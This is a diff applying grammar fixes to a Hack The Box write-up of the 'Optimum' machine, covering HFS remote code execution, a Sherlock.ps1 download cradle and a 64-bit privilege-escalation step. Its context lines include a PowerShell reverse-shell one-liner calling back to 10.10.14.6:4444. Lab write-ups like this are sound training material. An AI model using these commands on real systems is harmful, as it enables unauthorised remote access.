@@ -20,7 +20,7 @@ IP:10.10.10.8
 
 # Port Scan
 
-Like every hack the box machine I started with a nmap utilizing the nmap scripting engine to run default scripts and enumerate service versions. There is only one open port on this machine, port 80 serving a HttpFileServer. HttpFileServer (HFS) is a free file server that runs over HTTP.
+Like every Hack The Box machine I started with a nmap utilizing the nmap scripting engine to run default scripts and enumerate service versions. There is only one open port on this machine, port 80 serving a HttpFileServer. HttpFileServer (HFS) is a free file server that runs over HTTP.
 
 `nmap -p- -sVC -oN scriptScan.nmap 10.10.10.8`
 
@@ -38,7 +38,7 @@ Going to `http://10.10.10.8` shows the HFS home page. The first thing that I not
 
 ![Optimum](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/optimum/image1.png)
 
-I ran a `searchsploit` against that version and there are a handful of RCE vulnerability available.
+I ran a `searchsploit` against that version and there are a handful of RCE vulnerabilities available.
 
 ```
 ┌──(root㉿kali)-[~/htb/optimum]
@@ -70,7 +70,7 @@ File Type: ASCII text, with very long lines (546)
 Copied to: /root/htb/optimum/49584.py
 ```
 
-I opened the exploit with `vim 49584.py` to review the code to see what it is doing. The first couple of lines are just importing libraries. Then it defines some variables for the `lhost` and `rhost`, I went ahead and changed the `lhost` and `lport` to my IP and port I will be listening on. Next it will create a new variable that contains the reverse shell command. It is then encoded and the final payload is created and sent. The only thing that I changed was the `lhost`, and `lport`.
+I opened the exploit with `vim 49584.py` to review the code to see what it is doing. The first couple of lines is just importing libraries. Then it defines some variables for the `lhost` and `rhost`, I went ahead and changed the `lhost` and `lport` to my IP and port I will be listening on. Next, it will create a new variable that contains the reverse shell command. It is then encoded and the final payload is created and sent. The only thing that I changed was the `lhost`, and `lport`.
 
 ```python
 #!/usr/bin/python3
@@ -139,7 +139,7 @@ PS C:\Users\kostas\Desktop>
 
 # NT Authority\\System
 
-Running `systeminfo` I saw that this is running `Microsoft Windows Server 2012 R2 Standard`. This is an older version of the windows server, it was released in Oct of 2013 and will hit it's end of life Oct 2023. There is a good chance that this machine is not updated and an exploit is available for it.
+Running `systeminfo` I saw that this is running `Microsoft Windows Server 2012 R2 Standard`. This is an older version of the windows server, it was released in Oct of 2013 and will hit its end of life Oct 2023. There is a good chance that this machine is not updated and an exploit is available for it.
 ```
 PS C:\Users\kostas\Desktop> systeminfo                                                                                                                       
                                                                                                                                                              
@@ -152,7 +152,7 @@ OS Build Type:             Multiprocessor Free
 Registered Owner:          Windows User 
 ```
 
-A lot of the windows exploit suggested scripts/programs are old and not very well maintained. However it would be worth running some of them on this machine as it is older. Rasta Mouse created a PowerShell script called [Sherlock.ps1](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1) that I ran against the machine. I downloaded the script onto my Kali machine using `wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1`. I appended `Find-AllVulns` to the last line of the file so it will execute with a download cradle. I then hosted the file using `python3 -m http.server 80`
+A lot of the windows exploit suggested scripts/programs are old and not very well maintained. However, it would be worth running some of them on this machine as it is older. Rasta Mouse created a PowerShell script called [Sherlock.ps1](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1) that I ran against the machine. I downloaded the script onto my Kali machine using `wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1`. I appended `Find-AllVulns` to the last line of the file so it will execute with a download cradle. I then hosted the file using `python3 -m http.server 80`
 
 Below is a snip from the windows machine where I used a download cradle to download and execute `Sherlock.ps1`. There are three potential options to escalate my privs to NT Authority\\System 
 ```
@@ -180,7 +180,7 @@ VulnStatus : Appears Vulnerable
 
 ## Architecture
 
-From where I am at in the exploitation of this machine none of those exploits will work . Why you might ask, `Architecture`, all of these exploits are written for 64-bit. Right now our powershell process is most likely in a 32-bit process, because thats what HFS was running in when we got the shell. Its also generally better to be in a 64-bit process, exploits work better. I can confirm that we are in a 32-bit process with this command `[Environment]::Is64BitProcess`
+From where I am at in the exploitation of this machine none of those exploits will work. Why you might ask, `Architecture`, all of these exploits are written for 64-bit. Right now our powershell process is most likely in a 32-bit process, because that's what HFS was running in when we got the shell. Its also generally better to be in a 64-bit process, exploits work better. I can confirm that we are in a 32-bit process with this command `[Environment]::Is64BitProcess`
 
 ```
 PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
@@ -201,7 +201,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',4444);$stream = $
 
 I then hosted the file with `python3 -m http.server 80`
 
-On the windows machine I changed my working directory to the 64 bit folder that contained the 64-bit powershell and used it to execute the reverse shell.
+On the windows machine, I changed my working directory to the 64 bit folder that contained the 64-bit powershell and used it to execute the reverse shell.
 ```
 cd C:\Windows\sysNative\WindowsPowerShell\v1.0
 
